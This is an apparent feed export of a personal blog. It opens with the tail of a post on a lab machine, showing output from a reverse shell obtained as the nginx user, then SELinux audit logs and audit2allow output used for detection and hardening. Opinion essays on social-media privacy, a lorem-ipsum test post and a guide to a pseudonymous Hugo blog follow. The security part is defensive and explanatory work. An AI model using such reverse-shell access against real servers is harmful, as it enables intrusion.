Connection received on 172.19.0.1 <span style="color:#bd93f9">59518</span>
bash: cannot <span style="color:#8be9fd;font-style:italic">set</span> terminal process group <span style="color:#ff79c6">(</span>41351<span style="color:#ff79c6">)</span>: Inappropriate ioctl <span style="color:#ff79c6">for</span> device
bash: no job control in this shell
bash-4.4$ id
id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>992<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>988<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>988<span style="color:#ff79c6">(</span>nginx<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">context</span><span style="color:#ff79c6">=</span>system_u:system_r:httpd_t:s0
bash-4.4$
</code></pre></td></tr></table>
</div>
</div><p>It works and we can audit the log. While the access is denied, in permissive=1 mode, the <code>connect</code> syscall is successful. We can see that <code>httpd_t</code> role is trying to target <code>http_port_t</code> role.</p>
<pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep httpd_t | tail -2
[..]
type=AVC msg=audit(1633280239.705:13241): avc: denied { name_connect } for pid=41450 comm=&quot;bash&quot; dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=1
type=SYSCALL msg=audit(1633280239.705:13241): arch=c000003e syscall=42 success=yes exit=0 a0=4 a1=559050fe8ad0 a2=10 a3=0 items=0 ppid=41449 pid=41450 auid=4294967295 uid=992 gid=988 euid=992 suid=992 fsuid=992 egid=988 sgid=988 fsgid=988 tty=(none) ses=4294967295 comm=&quot;bash&quot; exe=&quot;/usr/bin/bash&quot; subj=system_u:system_r:httpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=connect AUID=&quot;unset&quot; UID=&quot;nginx&quot; GID=&quot;nginx&quot; EUID=&quot;nginx&quot; SUID=&quot;nginx&quot; FSUID=&quot;nginx&quot; EGID=&quot;nginx&quot; SGID=&quot;nginx&quot; FSGID=&quot;nginx&quot;
</code></pre>
<p>Repeating the same but in <code>permissive=0</code> mode, we can&rsquo;t get a reverse shell and instead we have this audit log:</p>
<pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep httpd_t | tail -2
[..]
type=AVC msg=audit(1633281729.867:13299): avc:  denied  { name_connect } for  pid=42387 comm=&quot;bash&quot; dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
type=SYSCALL msg=audit(1633281729.867:13299): arch=c000003e syscall=42 success=no exit=-13 a0=4 a1=558212a0dad0 a2=10 a3=0 items=0 ppid=42386 pid=42387 auid=4294967295 uid=992 gid=988 euid=992 suid=992 fsuid=992 egid=988 sgid=988 fsgid=988 tty=(none) ses=4294967295 comm=&quot;bash&quot; exe=&quot;/usr/bin/bash&quot; subj=system_u:system_r:httpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=connect AUID=&quot;unset&quot; UID=&quot;nginx&quot; GID=&quot;nginx&quot; EUID=&quot;nginx&quot; SUID=&quot;nginx&quot; FSUID=&quot;nginx&quot; EGID=&quot;nginx&quot; SGID=&quot;nginx&quot; FSGID=&quot;nginx&quot;
</code></pre>
<p>We can audit why:</p>
<pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep httpd_t | grep name_connect | tail -1 | audit2why
type=AVC msg=audit(1633281729.867:13299): avc:  denied  { name_connect } for  pid=42387 comm=&quot;bash&quot; dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0

    Was caused by:
    One of the following booleans was set incorrectly.
    Description:
    Allow httpd to can network connect

    Allow access by executing:
    # setsebool -P httpd_can_network_connect 1
    Description:
    Allow httpd to graceful shutdown

    Allow access by executing:
    # setsebool -P httpd_graceful_shutdown 1
    Description:
    Allow httpd to can network relay

    Allow access by executing:
    # setsebool -P httpd_can_network_relay 1
    Description:
    Allow nis to enabled

    Allow access by executing:
    # setsebool -P nis_enabled 1
</code></pre>
<p>The settings that authorizes creation of network connection is:</p>
<pre tabindex="0"><code>cat /var/log/audit/audit.log | grep httpd_t | grep name_connect | tail -1 | audit2allow

#============= httpd_t ==============

#!!!! This avc can be allowed using one of the these booleans:
#     httpd_can_network_connect, httpd_graceful_shutdown, httpd_can_network_relay, nis_enabled
allow httpd_t http_port_t:tcp_socket name_connect;
</code></pre><h3 id="detecting-a-compromised-selinux-box-with-audit2allow">Detecting a compromised SeLinux box with audit2allow</h3>
<p><code>audit2allow</code> can tell all the rules that (would) have been blocked in enforcing mode:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>root@pit ~<span style="color:#ff79c6">]</span><span style="color:#6272a4"># audit2allow -i /var/log/audit/audit.log</span>


<span style="color:#6272a4">#============= httpd_t ==============</span>

<span style="color:#6272a4">#!!!! This avc can be allowed using one of the these booleans:</span>
<span style="color:#6272a4">#     httpd_can_network_connect, httpd_graceful_shutdown, httpd_can_network_relay, nis_enabled</span>
allow httpd_t http_port_t:tcp_socket name_connect;

<span style="color:#6272a4">#!!!! This avc can be allowed using the boolean &#39;httpd_can_network_connect&#39;</span>
allow httpd_t ricci_port_t:tcp_socket name_connect;

<span style="color:#6272a4">#!!!! This avc can be allowed using the boolean &#39;httpd_can_network_connect&#39;</span>
allow httpd_t tor_port_t:tcp_socket name_connect;

<span style="color:#6272a4">#============= snmpd_t ==============</span>
allow snmpd_t admin_home_t:file <span style="color:#ff79c6">{</span> getattr open <span style="color:#8be9fd;font-style:italic">read</span> <span style="color:#ff79c6">}</span>;

<span style="color:#6272a4">#============= user_t ==============</span>
allow user_t init_var_run_t:service status;
allow user_t pam_var_run_t:dir write;
allow user_t self:capability sys_resource;
allow user_t tuned_t:dbus send_msg;
</code></pre></td></tr></table>
</div>
</div><p>It is very useful for hardening because we can:</p>
<ol>
<li>set the box to permissive mode</li>
<li>create a baseline of legit activity by performing only legit activity (assume no forbidden activity is done )</li>
<li>add the rules with <code>audit2allow -i /var/log/audit/audit.log</code></li>
<li>set the box to enforcing mode</li>
</ol>
<p>On the above example, forbidden activities detected are:</p>
<ul>
<li>nginx or php trying to target <code>http_port_t</code> to connect a socket</li>
<li>nginx or php trying to target <code>ricci_port_t</code> (cluster management) to connect a socket</li>
<li>nginx or php trying to target <code>tor_port_t</code> to conect a socket</li>
<li>snmpd trying to read file having extended attribute <code>admin_home</code> (cat /root/root.txt)</li>
<li>user_t is being denied several resources (e.g service, pam, dbus &hellip; ) which I am not familiar with</li>
</ul>
<h2 id="explore-selinux-configuration">Explore SELinux configuration</h2>
<p>[root@pit ~]# cat /etc/selinux/config</p>
<pre tabindex="0"><code># This file controls the state of SELinux on the system.
# SELINUX= can take one of these three values:
# enforcing - SELinux security policy is enforced.
# permissive - SELinux prints warnings instead of enforcing.
# disabled - No SELinux policy is loaded.
SELINUX=enforcing

# SELINUXTYPE= can take one of these three values:
# targeted - Targeted processes are protected,
# minimum - Modification of targeted policy. Only selected processes are protected.
# mls - Multi Level Security protection.

SELINUXTYPE=targeted
</code></pre>]]></content></item><item><title>Social Media Dont Care for Your Privacy</title><link>https://0xade1.github.io/posts/2021/09/social-media-dont-care-for-your-privacy/</link><pubDate>Wed, 29 Sep 2021 10:05:52 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/social-media-dont-care-for-your-privacy/</guid><description>The Maslow pyramid
Social Media lures you to believe they care for your wellness Over the years, Social Media has hired Neuroscientists to make their platform so addictive that the psychological needs has been revisited and took priority over Security and safety. How secure and how private is our data matters less then our perception of privacy and security; and therefore while we focus less in Digital Safety then our needs for digital social interaction, social media invests more into Public Relationship, lawyers, marketing and lobbyist to secure their reputation.</description><content type="html"><![CDATA[<p><strong>The Maslow pyramid</strong></p>
<h2 id="social-media-lures-you-to-believe-they-care-for-your-wellness">Social Media lures you to believe they care for your wellness</h2>
<p>Over the years, Social Media has hired Neuroscientists to make their platform so addictive that the psychological needs has been revisited and took priority over Security and safety. How secure and how private is our data matters less then our perception of privacy and security; and therefore while we focus less in Digital Safety then our needs for digital social interaction, social media invests more into Public Relationship, lawyers, marketing and lobbyist to secure their reputation.</p>
<table>
<thead>
<tr>
<th>needs</th>
<th>how it is perverted</th>
</tr>
</thead>
<tbody>
<tr>
<td>self-esteem</td>
<td>it is replaced with esteem of its public image and result in a new norm of social pressure and hypocrisis, where we are crafting ourselves a story we want to sell. Whether political or holidays picture, we mostly shows and entertain the audience with the bright side of our life; no wonder why Facebook Instagram call it stories.</td>
</tr>
<tr>
<td>friends?</td>
<td>lines are blurred between true friendship vs so-called friends who are in fact simple relationship, or linked people we barely know intimately</td>
</tr>
<tr>
<td>belongingness</td>
<td>This feeling is somehow satisfied by jailing us into a bubble of center of interests that prevents us to hear or confront our thoughts with other groups of people having a different opinion. Instead we belong into cohorts of people easily manipulable and convinced of the superiority or rightfulness of our thoughts and ideologies because we are comforted by our cohort which approve one-another tweet or post</td>
</tr>
<tr>
<td>love, like</td>
<td>Unconscious pleasure of being loved when receiving likes, or simply by liking massively the same things which provides a fake feeling of accomplishment and comfort us in our <code>likes</code>, while in fact it is less driven by our rational intellect then by our emotions. Instant short video and immediate emotions vehiculed via <code>Snaps</code> or <code>stories</code> matters more then deep-dive analysis</td>
</tr>
<tr>
<td>intimacy</td>
<td>Does anyone believe a Messenger conversation is intimate? Does anyone believe our navigation history is not recorded?</td>
</tr>
<tr>
<td>Security and safety</td>
<td>this is a pure illusion: behind the scene, your data is sold, is crunched into multiple hands, stored often without retention unless heavy regulation such as in financials organization.</td>
</tr>
</tbody>
</table>
<h2 id="avoiding-profiling-can-extend-your-horizons">Avoiding profiling can extend your horizons</h2>
<p>When you are profiled, you have acces to less content because those big tech will always propose and promote content that fits a certain profile. We are not talking yet of censorship but it has been theorized that people spend more time on topics that attract their attention. As the objective is to keep you as much as possible in the platform, it is not a surprise that those algorithms tamper your navigation and jail you within a bubble of information that comfort you in a certain vision of the world.
you navigation towards content that fits your interests.</p>
<p>In this social media Monopoly game, avoiding profiling is a card to break free from jail, to reach more contents, more ideas, deeper analysis as opposed to shallow immediate reactions. It gives you more opportunities to understand or discuss with people of different opinions and backgrounds. Social Media is a dangerous place of fabric of the opinion, whether dominant ideology, government propaganda or conspiracy theories. It is also the place of emotionally driven over-reactions to viral content that entertains us away from approaching different topics with the critical-thinking it deserves and eradicate all tolerance to non-manicheist opinions bringing shades in the discussion as opposed to choose an extreme side of the discussion &hellip; such as the infamous <code>anti-whatever</code> vs enlightened <code>pro-whatever</code>, or the dumb <code>conspiracist</code> vs those who deny the existence of conspiracies, powerful lobbies, interests or influence.</p>
<p>In some countries your profile, your religion, your beliefs, your positions pro or against societal paradigms, will have dramatic consequences in your Social Score, which will impact or threaten your life: dissidents can be eliminated before their voice has a certain reach.</p>
]]></content></item><item><title>Are Privacy Laws a Joke About Privacy?</title><link>https://0xade1.github.io/posts/2021/09/are-privacy-laws-a-joke-about-privacy/</link><pubDate>Wed, 29 Sep 2021 05:32:17 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/are-privacy-laws-a-joke-about-privacy/</guid><description>You dont read Terms and Conditions of services you use Let&amp;rsquo;s face the reality, you can&amp;rsquo;t read 20 min of Terms and Conditions in 2 seconds every website or services you visit
Have you actually, once in your life, seriously read one with all the attention it deserves to fully understand at which extent your privacy is at stake? I did it couple of times before I realized how vain effort it was.</description><content type="html"><![CDATA[<h2 id="you-dont-read-terms-and-conditions-of-services-you-use">You dont read Terms and Conditions of services you use</h2>
<blockquote>
<p>Let&rsquo;s face the reality, you can&rsquo;t read 20 min of Terms and Conditions in 2 seconds every website or services you visit</p>
</blockquote>
<p>Have you actually, once in your life, seriously read one with all the attention it deserves to fully understand at which extent your privacy is at stake? I did it couple of times before I realized how vain effort it was. Every single words and statements are carefully crafted to enable business to use your data in every manner possible and avoid any liability. Terms and conditions are changing multiple times a week or even a day for some big techs, and most of those terms being online, you may not be able to remember which version of those terms you once have accepted without investigating the <a href="https://web.archive.org/">wayback machine</a>.</p>
<p>It is a real chance that terms and conditions does not substitute to law and may be considered abusive in Court in some circumstances. To illustrate, F-Secure made this little <a href="https://www.theguardian.com/technology/2017/jul/14/wifi-terms-and-conditions-thousands-sign-up-clean-sewage-did-not-read-small-print">social experiment</a> where people where unwillingly accepting the unacceptable simply because they did not read the small prints to obtain free WiFi: the &ldquo;Herod clause&rdquo; was requiring them to give away their first born child, or they found themselves legally bounded to thousands of hour of community services to clean sewage.</p>
<h2 id="theyll-wait-until-you-give-up-and-approve-what-you-disagree">They&rsquo;ll wait until you give-up and approve what you disagree</h2>
<p>At the patience game of who will give-up first into accepting or removing unfair terms and conditions, Big Techs wins. They have all the time in the world to wait for you to accept the new terms and reopen the services, while on the other hand, you may have a Business or something that relies on this service and therefore you may be loosing money unless you consent to approve those changes. Regardless whether those changes are fair or not, you can still challenge in court but it is costly and most jurisdiction being liberal will be in favor of not intervening into companies private business and policies. They are very well aware of what people can and can&rsquo;t do and are often playing cards keeping people ignorant of some rights.</p>
<p>A good example are <code>cookies</code> when visiting websites. If you are like me, you don&rsquo;t like being tracked by them so perhaps you use some extensions to block them. However every visit of an article on some major websites will require us to approve usage of cookies as well as their terms before accessing the page, article or content which is otherwise publicly available. It is totally fine to refuse those cookies, but see:</p>
<ul>
<li>how big is the <code>I approve everything</code> button</li>
<li>where is the <code>I refuse</code> button or the <code>maybe another time, please</code> option?</li>
<li>when you can refuse you are kicked out with a message: Sorry you can&rsquo;t access the service without accepting our terms.</li>
<li>how a single click on the <code>I approve</code> button binds you with current and future terms, with a simple cookie</li>
<li>how complex for most it is too managed every single cookies</li>
</ul>
<p>This is even more obvious on mobile applications at every single Android or iOS update, you have to accept and can&rsquo;t refuse unless you want to stay exposed with unpatched critical vulnerabilities that may expose your data even more. You have to accept Instagram or Whatsapp new terms or you will progressively or immediately loose the whole or part of the service: a pop-up will harass you and show-up every time the app is being used until you finally click (often by accident) on the <code>OK</code> button. Impossible trade-off to compromise security for privacy, I&rsquo;ll loose both if I choose this path &hellip;</p>
<h2 id="should-i-approve-everything-or-refrain-from-using-it">Should I approve everything or refrain from using it</h2>
<p>You may disagree a single term or a unique condition among hundreds, well in this case, we can say that you have the right not to use this services? After all those are private business that offers you a service, sometimes without a Premium, and therefore they have the right to force your consent into approving every single of their hundreds of terms? Silly of me, we don&rsquo;t have all the same reasons and incentives (not) to use a certain service, so there is no single right answer and each of us <strong>HAVE TO</strong> abide and accept every single terms to use those services, unless we want to be a social media hermit.</p>
<p>In fact this is not a real choice, it is rather <strong>an extorsion of consent</strong> in a form of forcing you to make a compromise between what you think is deemed acceptable vs what is not acceptable, and therefore it is all about the perceived value of the service. How does <code>Acceptance</code> of the unacceptable hurts you less or more then the need or satisfaction of enjoying this service? It is commonly established that human beings are social &ldquo;animals&rdquo; and that The Needs for social interaction is among the most prominent in the <strong><a href="https://0xade1.github.io/posts/2021/09/social-media-dont-care-for-your-privacy/">Maslow pyramid</a></strong>. The telephone, the internet were once limited to an elite before it got considered as <strong>first necessity</strong> services that should be guaranteed by governments; in the same manner and without falling into communism, the right to access social media services and exercise free-speech without being shutdown or erased because of the shareholder or executive ideology of the moment, should be a right guaranteed by governments and ruled by law where only a judge can decide to conceal or delete your content.</p>
<p>Youngest generation from the 2000s never had a digital privacy and lack of safety education or awareness that <a href="https://0xade1.github.io/posts/2021/09/social-media-dont-care-for-your-privacy/">social media aims to make money more then they care for our wellness</a>**. The telephone, the internet were once limited to an elite before it got considered as **first necessity** services that should be guaranteed by governments; in the same manner and without falling into communism, the right to access social media services and exercise free-speech without being shutdown or erased because of the shareholder or executive ideology of the moment, should be a right guaranteed by governments and ruled by law where only a judge can decide to conceal or delete your content., they were born in a period of explosion of social media where everything has to be shared, and our teenagers are very sensitive to social code and pressure to be followed.</p>
<p>We are litterally replacing the 90s generation of privacy-minded people borned with a wild and free internet with a new generation of young people unaware of the importance of protecting and keeping control on their private information, as well as not delegating their security and privacy to companies they should protect themselves from: I perceive this generation as too easily consenting to approve everything and very prone to leak very private information that could be used by governments, private companies, or &ldquo;friends&rdquo; into coercing them to do what they will otherwise be reluctant to approve.</p>
<h2 id="a-pact-with-the-devil-you-cant-sign-out">A pact with the devil you can&rsquo;t sign-out?</h2>
<blockquote>
<p>Does your acceptance of past terms implies acceptance of any future terms?</p>
</blockquote>
<p>Of course it does not, but nonetheless <strong>so called minor changes</strong> are constant and fortunately do not require you to re-approve every single time. Overtime, the lump sum of those insignificant changes may result in something very different then the initially approved terms. How many people tracking and reviewing those changes? well, it is safe to say not legion, or at least not me, because time is too precious to be spend it in lost causes. Anyway, most of us, if not all, do not even remember when or <strong>what have we &ldquo;accepted&rdquo; on the past</strong> (assuming we ever read it); and it is only when we feel we have been screwed-up, that we start to experience that sharing our data may have consequences and that fraud exists with companies knowingly or inadvertently abusing customer rights. We may shout and engage in court, maybe following a data breach headline on the newspapers &hellip; but it is generally too late. <a href="https://haveibeenpwned.com/">Try it yourself</a> and look on how many data breach your personal details have been leaked.</p>
<p>The internet has a memory and never forget: once your data is leaked, it is available forever, either publicly or in the darkweb. Also the concept of <code>privacy</code> means different things between jurisdiction, resulting in an incredible misunderstanding of each other regulation and laws as well as many misconceptions on what is vs what is not privacy.</p>
<blockquote>
<p>Is my PII something I have or something I am?</p>
</blockquote>
<p>PII stands for Private Individual Information, and depending on the history (European citizens have a long history of privacy invasions with hundreds of wars, while US history is more recent) the definition of privacy differs very clearly. In Europe, PII is something that belongs to the being with the meaning of <code>something I am</code> while in most english speaking countries that have not been occupied during world wars, it is more <code>something I have</code>. From this starting point, it is easy to understand, that I can sell the property that I have while I cannot sell what I am (an organ, an eye &hellip;, well in some countries you definitely can).</p>
<blockquote>
<p>Is the color of my eyes an attribute that my eyes have or is it part of my identity. Can someone trade the color of my eyes, my organ, or any part or the whole of my identity or body? Can I sell my identity, or can my identity or part of it be sold or disclosed to a third party?</p>
</blockquote>
<p>How to evaluate the damages and the material compensation for a PII data being leaked? In the US, privacy has its moment only when it comes with cyber breach making headlines. Also the Legal system in the US can&rsquo;t easily establish that there is actually financial damages unless you are financially robust to pay a lawyer or join a class action.</p>
<h2 id="why-do-i-have-to-trust-third-parties">Why do I have to trust Third-parties?</h2>
<p>Remember Cambridge Analytica? No Facebook users ever heard of or knew that this third-party company was harvesting their most private data to profile users and influence election. That was lawfully possible thanks to Facebook Terms and Conditions. If I trust Facebook, does it mean I have to trust any of its third parties?</p>
<p>With some media propaganda and Public Relationship magic, all the blame was thrown-away by Facebook onto this British company and its holding who did not survive its reputation loss. While Facebook on the other hand was almost totally waived of its responsibility in the opinion. If I give my money to a bank and this bank looses my money because of its third-party committing a crime or a fraud, well I have no knowledge of this third-party, any clause waiving the bank of its responsibility can be considered abusive in court, and I am rightfully keeping the bank fully accountable to recover my assets and liable for any damages it causes. Sadly it does not work the same with Data mishandling or data breaches.</p>
<h2 id="rgpd-brings-a-lot-of-improvements-to-customer-rights">RGPD brings a lot of improvements to customer rights</h2>
]]></content></item><item><title>Test3</title><link>https://0xade1.github.io/posts/2021/09/test3/</link><pubDate>Sun, 26 Sep 2021 20:32:30 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/test3/</guid><description>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque.</description><content type="html">
&lt;p>&lt;em>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque malesuada, quam a tincidunt commodo, dolor diam rutrum felis, a pulvinar justo orci quis ipsum.&lt;/em>&lt;/p></content></item><item><title>How I built this privacy friendly blog</title><link>https://0xade1.github.io/posts/2021/09/how-i-built-this-privacy-friendly-blog/</link><pubDate>Sun, 26 Sep 2021 11:28:33 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/how-i-built-this-privacy-friendly-blog/</guid><description>Why I built this blog Social Media dominant ideology is corrupting people thoughts In an increasingly manicheist world loosing its sense of shades and scales of Tolerance towards extremes sides, I found difficult to publicly express my view of facts and events that may contradicts dominant ideology. I was looking for a way to post my opinions and thoughts online while avoiding the new norm of social media pressure that systematically judges you according to some political prism or psychological bias.</description><content type="html"><![CDATA[<h2 id="why-i-built-this-blog">Why I built this blog</h2>
<h3 id="social-media-dominant-ideology-is-corrupting-people-thoughts">Social Media dominant ideology is corrupting people thoughts</h3>
<p>In an increasingly manicheist world loosing its sense of shades and scales of Tolerance towards extremes sides,
I found difficult to publicly express my view of facts and events that may contradicts dominant ideology.
I was looking for a way to post my opinions and thoughts online while avoiding the new norm of social media pressure
that systematically judges you according to some political prism or psychological bias.</p>
<p>While social network is the right place to reach the mass, it is certainly not the forum were you can speak freely and openly
without consequences, and I felt my wording will be influenced by my readers and not honestly reflects what is on my mind.
Thinking a bit further I have realized that my readers may want to comment as well,
and I was wondering how I could offer them this feature with the same level of privacy I am advocating in this post.</p>
<blockquote>
<p>This is the limit of freedom of speech when you apply self-censorship to avoid hypothetical consequences that may or may never occure,
such as loosing your job, contracts or opportunities because some folks may not like what you have to say.</p>
</blockquote>
<p>So well I have chosen to keep my ambition small with a limited reach and without associating my name in a too obvious manner
to whoever may want to use what I have posted online against me.
I bet that those who find value in what I post will share and promote its content
or follow some of the present guidelines in this article to safeguard their own privacy,
and I trust that those who know me will respect that and avoid to disclose my identity.</p>
<h3 id="we-are-constantly-tracked-and-profiled">We are constantly tracked and profiled</h3>
<p><strong>Anonymity vs Pseudonymity vs Privacy</strong></p>
<p>Purpose in here has never been and will never be anonymity: any motivated actors or government can easily track back to my personal identity.
Pseudonymity is more appropriate to describe in which way I can reach a much better level of privacy that prevents:</p>
<ul>
<li>mass surveillance of citizen&rsquo;s opinion from governments</li>
<li>tracking, profiling and targeted ads from big techs</li>
<li>internal pressure or retorsion ignited be your company executives</li>
</ul>
<p><strong>A blog that tracks my audience hurts my life principles</strong></p>
<p>I could have chosen the lazy way with a blog hosted in <strong>medium</strong> or <strong>blogpost</strong> or equivalent.
However the entire purpose of this is to raise awareness and protect my audience privacy from various tracking and fingerprinting techniques:</p>
<ul>
<li>capture your cookies or navigation history</li>
<li>capture your movement from, to or within the website</li>
<li>capture your eyes: which portion of a page are you looking the most</li>
<li>map your visit activity with an external account (google)</li>
<li>harvest your details for commercial gain</li>
<li>track your identity for marketing campaigns through various techniques:
<ul>
<li>browser fingerprinting</li>
<li>device fingerprinting</li>
</ul>
</li>
<li>Deliver a personalized customer journey <strong>bullshit</strong> across devices, channels and platforms with Adbrain customer ID mapping technology</li>
<li>Behavioral fingerprinting with Machine Learning behavior pattern analysis</li>
<li>bother your audience with advertisement within your site, even when they don&rsquo;t comment</li>
<li>slow down navigation and traffic, and may even lag when showing my pages</li>
<li>use domain obfuscation and various techniques to try to evade ads blocker</li>
</ul>
<p>As a side note, 99% of the internet is embedding tracker such as google-analytics, twitter or facebook like buttons and much more,
and github may have some analytics on server logs regarding github-pages,
so I can only advocate that you use at least a VPN or some kind of browser extensions such as <strong>ublock origin</strong> or <strong>privacy badger</strong>.
But this is another blog post topic.</p>
<h2 id="how-i-built-this-privacy-friendly-blog">How I built this privacy friendly blog</h2>
<h3 id="a-private-email-address-to-register-github-pages">a private email address to register github pages</h3>
<ol>
<li>
<p>I have first created an anonymous email address for the solely purpose to register a github account without sharing my personal details or email.
Any privacy-friendly email provider such as protonvpn or tutanota will be fine, as long as they don&rsquo;t track you. I won&rsquo;t use this email or email alias for any other purpose.</p>
</li>
<li>
<p>As a first approach and before investing in domain name and hosting, we can host our website for free on <strong><a href="https://pages.github.com/">github pages</a></strong>.
The website will be accessible with <code>username.github.io</code>, so it is better not to use an overly complicated or long username, short is better.
Should I mention that putting your real name as username, defeats the purpose of this article?</p>
<p><strong>pros and cons of github pages</strong></p>
<table>
<thead>
<tr>
<th>what</th>
<th>pros</th>
<th>cons</th>
</tr>
</thead>
<tbody>
<tr>
<td>money trail</td>
<td>hard to deanonymize</td>
<td>free plan does not allow multiple blog hosting</td>
</tr>
<tr>
<td>multiple blogs</td>
<td>only one free github-pages per account</td>
<td>you need multiple accounts or go for a paid plan =&gt; money-trail</td>
</tr>
<tr>
<td>identity management</td>
<td>You have to setup a unique github identity per blog</td>
<td>Extra care to avoid real identity leak when multiple github identity on your laptop</td>
</tr>
<tr>
<td>Availability scalability</td>
<td>You don&rsquo;t have to managed that</td>
<td>depends on github terms evolution, they can erase you if they don&rsquo;t like you</td>
</tr>
<tr>
<td>Traffic Revenue</td>
<td>No ads, No third-party cookies and trackers</td>
<td>No revenue from traffic, No visibility on traffic</td>
</tr>
<tr>
<td>comments</td>
<td>github users can comment</td>
<td>Anonymous comments not recommended =&gt; will leak a token having write comments permission</td>
</tr>
<tr>
<td>moderation</td>
<td>You can moderate comments</td>
<td>This is your place of free speech, not a forum for haters =&gt; you&rsquo;ll be blamed for censoring them</td>
</tr>
<tr>
<td>github-actions</td>
<td>automated deployment =&gt; better SecOps, lower risk of leak</td>
<td>Manual commit may leak your real identity if you commit with the wrong username, beware of <code>git config</code></td>
</tr>
<tr>
<td>backup</td>
<td>Multiple local and remote copies of this repository</td>
<td>Don&rsquo;t forget gihub terms may change in the future</td>
</tr>
<tr>
<td>static back-end</td>
<td>robustness and security</td>
<td>much harder to make it interactive, unless heavy javascript or third-party backend</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h3 id="a-statically-generated-website-not-to-be-hacked">A statically generated website not to be hacked</h3>
<p>What is common with all <strong>CMS (Content management system)</strong> I know such as <code>wordpress</code>, <code>drupal</code>, <code>joomla</code> &hellip;
is how frequently hackers exploits zero-days or disclosed vulnerabilities to compromise those websites.
Whether the backend is PHP, ASP.Net, Java, Nodejs, &hellip; does not matter as much as the perspective for a hacker to takeover
the website backend to remotely execute code. Another major issues are backend and software updates (operating system, CMS &hellip;)
which may not be performed timely, or may break the website between major upgrades.
I personnally don&rsquo;t want to spend time patching things of fixing things after patching.</p>
<p>To avoid the above issues, I made the decision to go for a statically generated website with <a href="https://gohugo.io/">Hugo</a>
